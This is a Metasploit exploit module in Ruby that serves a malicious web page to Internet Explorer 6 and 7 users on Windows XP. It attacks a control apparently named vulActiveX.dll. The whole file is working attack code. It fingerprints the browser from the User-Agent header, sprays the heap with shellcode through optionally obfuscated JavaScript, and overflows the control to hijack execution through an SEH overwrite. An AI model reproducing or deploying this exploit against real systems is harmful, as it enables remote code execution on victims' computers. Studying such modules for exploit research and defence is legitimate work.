require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML


	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'vulActiveX.dll SEH Exploit',
			'Description'    => %q{
					This module exploits a seh vulnerability within vulActiveX.dll.
		                 
		                 This exploit utilizes a combination of heap spraying and 
		                 SEH Overwrite technique. Presently this exploit does not
		                 bypass DEP and ASLR. Unfortunately unable to find correct 
		                 gadagets to do stack pivoting.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Ashfaq Ansari' ],
			'Version'        => '$Revision: 1$',
			'References'     =>
				[
					[ 'URL', 'http://hacksys.vfreaks.com/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
					[ 'Internet Explorer 6 - Windows XP SP3', { 'Ret' => 0x06060606 } ],
					[ 'Internet Explorer 7 - Windows XP SP3', { 'Ret' => 0x0c0c0c0c } ],
				],
			'DisclosureDate' => '',
			'DefaultTarget'  => 0))
		
		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', true])
			], self.class)
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def auto_target(cli, request)
		
		agent = request.headers['User-Agent']
		print_status("Checking user agent: #{agent}")

		if agent =~ /MSIE 6\.0/
			print_status("Victim is running Internet Explorer 6")
			mytarget = targets[1]
		elsif agent =~ /MSIE 7\.0/
			print_status("Victim is running Internet Explorer 7")
			mytarget = targets[2]
		else
			print_error("Victim's browser is not supported")
			mytarget = nil
		end

		return mytarget

	end
	
	def on_request_uri(cli, request)
		mytarget = target
		
		print_status("#{cli.peerhost}:#{cli.peerport} Received request for %s" % request.uri.inspect)
		
		if target.name == 'Automatic'
			mytarget = auto_target(cli, request)
			if mytarget.nil?
				send_not_found(cli)
				return
			end
		end
		
		return if ((p = regenerate_payload(cli)) == nil)

		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		
		ret     = Rex::Text.uri_encode([mytarget['Ret']].pack('V*'))

		nops = Rex::Text.to_unescape(make_nops(4))
		
		js = <<-JS

		shellcode = unescape('#{shellcode}');
		
		nops = unescape('#{nops}');
		
		headersize = 20;
		
		slackspace = headersize + shellcode.length;
		while (nops.length < slackspace) nops += nops;
		fillblock = nops.substring(0, slackspace);

		block = nops.substring(0, nops.length - slackspace);
		while (block.length + slackspace < 0x50000) block = block + block + fillblock;
		
		memory = new Array();
		for (counter = 0; counter < 250; counter++) {
		  memory[counter] = block + shellcode;
		  window.status = "Heap Spraying: " + Math.round(100 * counter / 250) + "% done";
		}
		
		evil_payload = "";
		while (evil_payload.length < 14356) evil_payload += unescape('#{ret}');
		window.status = "Launching Exploit";
		_vulActiveX.BufferOverflow(evil_payload);
		JS

		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		content = <<-HTML
		<html>
		<head>
		<title>vulActiveX.dll - Metasploit Module - HeapSpray</title>
		<object classid='clsid:C44CBF61-7844-4C4B-BC77-7643FD70848E' id='_vulActiveX'>
		</object>
		<script type="text/javascript" language="javascript">
		#{js}
		</script>
		</head>
		<body>
		</body>
		</html>
		HTML

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)
	end

end